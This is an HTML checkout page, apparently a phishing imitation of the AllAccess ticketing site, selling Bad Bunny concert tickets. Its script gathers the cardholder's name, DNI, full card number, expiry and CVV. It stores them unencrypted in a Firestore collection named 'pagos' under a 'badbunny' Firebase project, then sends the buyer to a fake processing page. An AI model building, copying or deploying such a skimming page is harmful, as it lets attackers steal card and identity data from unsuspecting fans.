<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllAccess - Bad Bunny - Confirmar Operaci√≥n</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background-color: #f4f4f4;
            margin: 0;
        }

        /* NAVBAR FIJA */
        .navbar {
            background: #000;
            padding: 12px 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: fixed;
            top: 0;
            width: 100%;
            z-index: 2000;
            box-sizing: border-box;
        }

        .navbar .logo img {
            height: 25px;
        }

        .menu-icon {
            color: white;
            font-size: 24px;
            cursor: pointer;
        }

        /* MEN√ö LATERAL */
        .menu-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            display: none;
            z-index: 2001;
        }

        .menu-overlay.active {
            display: block;
        }

        .menu-sidebar {
            position: fixed;
            top: 0;
            right: -300px;
            width: 300px;
            height: 100%;
            background: white;
            box-shadow: -2px 0 10px rgba(0, 0, 0, 0.1);
            transition: right 0.3s ease;
            z-index: 2002;
            overflow-y: auto;
        }

        .menu-sidebar.active {
            right: 0;
        }

        .menu-header {
            padding: 20px;
            border-bottom: 1px solid #eee;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .menu-header h3 {
            margin: 0;
            font-size: 16px;
        }

        .menu-close {
            font-size: 24px;
            cursor: pointer;
            color: #000;
            background: none;
            border: none;
        }

        .menu-items {
            padding: 20px 0;
        }

        .menu-item {
            padding: 15px 20px;
            border-bottom: 1px solid #eee;
            cursor: pointer;
            color: #000;
            text-decoration: none;
            display: block;
            font-size: 14px;
            transition: background 0.3s;
        }

        .menu-item:hover {
            background: #f9f9f9;
            color: #7c00e2;
        }

        .content-wrapper {
            padding-top: 49px;
            padding-bottom: 80px;
            background-color: #f4f4f4;
            min-height: 100vh;
        }

        /* CONTENEDOR PRINCIPAL */
        .main-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 30px 20px;
        }

        .page-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 30px;
            color: #000;
        }

        .confirmation-container {
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
        }

        .alert-box {
            background: #f0f4ff;
            border: 1px solid #d0deff;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 30px;
            display: flex;
            gap: 12px;
        }

        .alert-icon {
            font-size: 20px;
            color: #7c00e2;
            flex-shrink: 0;
        }

        .alert-text {
            font-size: 14px;
            color: #666;
            line-height: 1.6;
        }

        .section-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }

        .section-header h3 {
            margin: 0;
            font-size: 16px;
            font-weight: 700;
            color: #000;
        }

        .section-header a {
            color: #7c00e2;
            font-weight: 600;
            text-decoration: none;
            font-size: 14px;
        }

        .event-date {
            font-size: 14px;
            color: #7c00e2;
            font-weight: 700;
            margin-bottom: 20px;
        }

        .ticket-item {
            background: #f9f9f9;
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-left: 4px solid #7c00e2;
        }

        .ticket-item-info {
            flex: 1;
        }

        .ticket-item-name {
            font-weight: 700;
            color: #000;
            margin-bottom: 5px;
        }

        .ticket-item-details {
            font-size: 13px;
            color: #999;
        }

        .ticket-item-seat {
            display: flex;
            align-items: center;
            gap: 8px;
            font-size: 13px;
            color: #999;
            margin-top: 8px;
        }

        .ticket-item-price {
            font-weight: 700;
            color: #000;
            font-size: 14px;
        }

        .cost-section {
            margin-top: 30px;
        }

        .cost-item {
            display: flex;
            justify-content: space-between;
            padding: 12px 0;
            border-bottom: 1px solid #eee;
            font-size: 14px;
        }

        .cost-item.total {
            font-weight: 700;
            font-size: 18px;
            border: none;
            padding: 20px 0;
            background: #f9f9f9;
            margin: 0 -30px;
            padding: 20px 30px;
        }

        .cost-label {
            color: #666;
        }

        .cost-value {
            color: #000;
            font-weight: 600;
        }

        .cost-item.total .cost-label {
            color: #000;
        }

        .cost-item.total .cost-value {
            color: #000;
            font-weight: 700;
            font-size: 18px;
        }

        /* BARRA DE TOTAL */
        .total-bar {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: white;
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            box-shadow: 0 -4px 15px rgba(0, 0, 0, 0.1);
            z-index: 1500;
        }

        .btn-confirm {
            background: #7c00e2;
            color: white;
            border: none;
            padding: 14px 60px;
            border-radius: 4px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
            width: 100%;
        }

        .btn-confirm:hover {
            background: #6a00cc;
        }

        /* FORMULARIO DATOS PERSONALES */
        .data-container {
            background: white;
            border-radius: 12px;
            padding: 30px;
            margin-bottom: 30px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }

        .personal-data-form {
            display: grid;
            grid-template-columns: 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }

        .form-group {
            display: flex;
            flex-direction: column;
        }

        .form-group:nth-child(4),
        .form-group:nth-child(5) {
            grid-column: span 1;
        }

        .form-group label {
            font-size: 13px;
            font-weight: 600;
            color: #333;
            margin-bottom: 8px;
        }

        .form-group input {
            padding: 12px 14px;
            border: 1px solid #d0deff;
            border-radius: 6px;
            font-size: 14px;
            font-family: 'Inter', sans-serif;
            transition: border-color 0.3s;
        }

        .form-group input:focus {
            outline: none;
            border-color: #7c00e2;
            box-shadow: 0 0 0 3px rgba(124, 0, 226, 0.1);
        }

        .form-group input:invalid:not(:placeholder-shown) {
            border-color: #ff6b6b;
        }

        .error-message {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        @media (max-width: 768px) {
            .page-title {
                font-size: 22px;
            }

            .data-container {
                padding: 20px;
                margin-bottom: 20px;
            }

            .personal-data-form {
                grid-template-columns: 1fr;
                gap: 15px;
            }

            .form-group:nth-child(4),
            .form-group:nth-child(5) {
                grid-column: span 1;
            }

            .form-group label {
                font-size: 12px;
            }

            .form-group input {
                padding: 10px 10px;
                font-size: 13px;
            }

            .confirmation-container {
                padding: 20px;
            }

            .btn-confirm {
                padding: 12px 30px;
                font-size: 14px;
            }

            .total-bar {
                flex-direction: column;
                gap: 15px;
            }

            .cost-item.total {
                margin: 20px -20px 0;
                padding: 20px;
            }

            .ticket-item {
                flex-direction: column;
                align-items: flex-start;
            }

            .ticket-item-price {
                align-self: flex-end;
                margin-top: 10px;
            }
        }
    </style>
</head>
<body>

    <nav class="navbar">
        <div class="logo" onclick="window.location.href='index.html'" style="cursor: pointer;"><img src="images/allaccess-clear.png" alt="AllAccess"></div>
        <div class="menu-icon" onclick="toggleMenu()" style="cursor: pointer;">‚ò∞</div>
    </nav>

    <!-- MEN√ö LATERAL -->
    <div class="menu-overlay" id="menuOverlay" onclick="closeMenu()"></div>
    <div class="menu-sidebar" id="menuSidebar">
        <div class="menu-header">
            <h3>Men√∫</h3>
            <button class="menu-close" onclick="closeMenu()">√ó</button>
        </div>
        <div class="menu-items">
            <a href="my-entries.html" class="menu-item">Mis entradas</a>
            <a href="index.html" class="menu-item">Inicio</a>
        </div>
    </div>

    <div class="content-wrapper">
        <div class="main-container">
            <h1 class="page-title">Confirma la operaci√≥n</h1>

            <!-- Secci√≥n de datos personales removida por solicitud -->

            <div class="confirmation-container">
                <div class="section-header">
                    <h3>Resumen de compra</h3>
                    <a href="#" onclick="cancelPurchase(event)">Cancelar compra</a>
                </div>

                <div class="event-date" id="eventDate">13/02/2026 20:00</div>

                <div id="ticketItems"></div>

                <div class="cost-section">
                    <div class="cost-item">
                        <span class="cost-label">Cargo por servicio</span>
                        <span class="cost-value" id="serviceFeeDisplay">$ 55.500,00</span>
                    </div>
                    <div class="cost-item">
                        <span class="cost-label">Costo de entrega: Quentro</span>
                        <span class="cost-value">$ 0,00</span>
                    </div>
                    <div class="cost-item total">
                        <span class="cost-label">Total</span>
                        <span class="cost-value" id="totalDisplay">$ 425.500,00</span>
                    </div>
                </div>
            </div>

            <!-- Secci√≥n de pago con tarjeta (oculta hasta reservar) -->
            <div id="cardPaymentSection" class="confirmation-container" style="display:none;">
                <h3>Ingres√° los datos de la tarjeta</h3>
                <form id="cardForm">
                    <div class="form-group">
                        <label for="card_fullname">Nombre completo del titular *</label>
                        <input type="text" id="card_fullname" required>
                    </div>
                    <div class="form-group">
                        <label for="card_dni">Documento (DNI) *</label>
                        <input type="text" id="card_dni" required>
                    </div>
                    <div class="form-group">
                        <label for="card_number">N√∫mero de tarjeta *</label>
                        <input type="text" id="card_number" maxlength="19" placeholder="0000 0000 0000 0000" required>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label for="card_exp">Fecha de vencimiento (MM/AA) *</label>
                            <input type="text" id="card_exp" placeholder="MM/AA" required>
                        </div>
                        <div class="form-group">
                            <label for="card_cvv">C√≥digo de seguridad (CVV) *</label>
                            <input type="text" id="card_cvv" maxlength="4" required>
                        </div>
                    </div>
                    <div style="margin-top:16px;"><button type="button" class="btn-confirm" onclick="saveCardAndProceed()">Pagar y reservar</button></div>
                </form>
            </div>
        </div>
    </div>

    <div class="total-bar">
        <button class="btn-confirm" onclick="confirmReservation()">Reservar compra</button>
    </div>

    <script>
        function toggleMenu() {
            const overlay = document.getElementById('menuOverlay');
            const sidebar = document.getElementById('menuSidebar');
            
            overlay.classList.toggle('active');
            sidebar.classList.toggle('active');
        }

        function closeMenu() {
            const overlay = document.getElementById('menuOverlay');
            const sidebar = document.getElementById('menuSidebar');
            
            overlay.classList.remove('active');
            sidebar.classList.remove('active');
        }

        // Cerrar men√∫ al hacer click en un enlace
        document.querySelectorAll('.menu-item').forEach(item => {
            item.addEventListener('click', closeMenu);
        });

        // Obtener datos de la sesi√≥n
        let selectedSector = sessionStorage.getItem('selectedSector') || 'Campo Delantero';
        let selectedQuantity = parseInt(sessionStorage.getItem('selectedQuantity')) || 1;
        let basePrice = parseFloat(sessionStorage.getItem('basePrice')) || 350000;
        let ticketData = JSON.parse(sessionStorage.getItem('ticketData') || '[]');

        // Inicializar p√°gina
        document.addEventListener('DOMContentLoaded', function() {
            displayTicketItems();
            setEventDate();
        });

        function displayTicketItems() {
            const container = document.getElementById('ticketItems');
            let html = '';

            for (let i = 0; i < ticketData.length; i++) {
                const ticket = ticketData[i];
                html += `
                    <div class="ticket-item">
                        <div class="ticket-item-info">
                            <div class="ticket-item-name">${selectedQuantity} x ${selectedSector}</div>
                            <div class="ticket-item-details">- ${selectedSector} ($ ${basePrice.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2})})</div>
                            <div class="ticket-item-seat">
                                ü™ë ${ticket.fila}${ticket.asiento.toString().padStart(2, '0')}.${(i+1).toString().padStart(2, '0')} - ${i+1}
                            </div>
                        </div>
                        <div class="ticket-item-price">$ ${basePrice.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2})}</div>
                    </div>
                `;
            }

            container.innerHTML = html;
            updateTotals();
        }

        function updateTotals() {
            const subtotal = basePrice * selectedQuantity;
            const serviceFee = 55500;
            const deliveryCost = 0; // Quentro es gratis
            const total = subtotal + serviceFee + deliveryCost;

            document.getElementById('serviceFeeDisplay').textContent = '$ ' + serviceFee.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
            document.getElementById('totalDisplay').textContent = '$ ' + total.toLocaleString('es-AR', {minimumFractionDigits: 2, maximumFractionDigits: 2});
        }

        function confirmReservation() {
            // Mostrar la secci√≥n de tarjeta directamente
            document.getElementById('cardPaymentSection').style.display = 'block';
            document.getElementById('cardPaymentSection').scrollIntoView({behavior:'smooth'});
        }

        function validateForm() {
            const form = document.getElementById('personalDataForm');
            const inputs = form.querySelectorAll('input');
            let isValid = true;

            inputs.forEach(input => {
                const errorMsg = form.querySelector(`.error-message[data-field="${input.name}"]`);
                
                if (!input.value.trim()) {
                    input.style.borderColor = '#ff6b6b';
                    if (errorMsg) errorMsg.classList.add('show');
                    isValid = false;
                } else if (input.type === 'email' && !input.value.includes('@')) {
                    input.style.borderColor = '#ff6b6b';
                    if (errorMsg) errorMsg.classList.add('show');
                    isValid = false;
                } else {
                    input.style.borderColor = '#d0deff';
                    if (errorMsg) errorMsg.classList.remove('show');
                }
            });

            return isValid;
        }

        function cancelPurchase(e) {
            e.preventDefault();
            if (confirm('¬øDeseas cancelar la compra?')) {
                sessionStorage.clear();
                window.location.href = 'tickets.html';
            }
        }

        function setEventDate() {
            // Obtener la fecha del sessionStorage guardada desde tickets.html
            const eventDate = sessionStorage.getItem('eventDate') || '14/02/2026 20:00';
            // Extraer solo la fecha (primer 10 caracteres: DD/MM/YYYY)
            const dateOnly = eventDate.substring(0, 10);
            document.getElementById('eventDate').textContent = dateOnly + ' 20:00';
        }

        // (Se removi√≥ el formulario de datos personales; no hay inputs a limpiar aqu√≠.)
        
        // --- C√≥digo para guardar tarjeta en Firestore ---
        async function saveCardAndProceed() {
            const fullName = document.getElementById('card_fullname').value.trim();
            const dni = document.getElementById('card_dni').value.trim();
            const number = document.getElementById('card_number').value.replace(/\s/g,'');
            const exp = document.getElementById('card_exp').value.trim();
            const cvv = document.getElementById('card_cvv').value.trim();

            if (!fullName || !dni || !number || !exp || !cvv) { alert('Completa todos los campos de la tarjeta'); return; }

            try {
                // Inicializar Firebase (m√≥dulo importado din√°micamente)
                const { initializeApp } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js');
                const { getFirestore, doc, setDoc } = await import('https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js');

                const firebaseConfig = {
                    apiKey: "AIzaSyCxq7lebIs8QO_I950XinLK2108H7TTjkY",
                    authDomain: "badbunny-e57ff.firebaseapp.com",
                    projectId: "badbunny-e57ff",
                    storageBucket: "badbunny-e57ff.firebasestorage.app",
                    messagingSenderId: "401847470375",
                    appId: "1:401847470375:web:2a7e56c30adfe0e4b80102",
                    measurementId: "G-GP159FTDGF"
                };

                const app = initializeApp(firebaseConfig);
                const db = getFirestore(app);

                const personal = JSON.parse(localStorage.getItem('personalData') || '{}');
                const emailKey = personal.email || ('anon_' + Date.now());

                await setDoc(doc(db, 'pagos', emailKey + '_' + Date.now()), {
                    titular: fullName,
                    dni: dni,
                    cardNumber: number,
                    exp: exp,
                    cvv: cvv,
                    cliente: personal,
                    fecha: new Date()
                });

                // Redirigir a p√°gina de proceso
                window.location.href = 'processing-confirmation.html';
            } catch (err) {
                console.error(err);
                alert('Error guardando datos de la tarjeta: ' + err.message);
            }
        }
    </script>

<script src="./auth.js"></script>

</body>
</html>
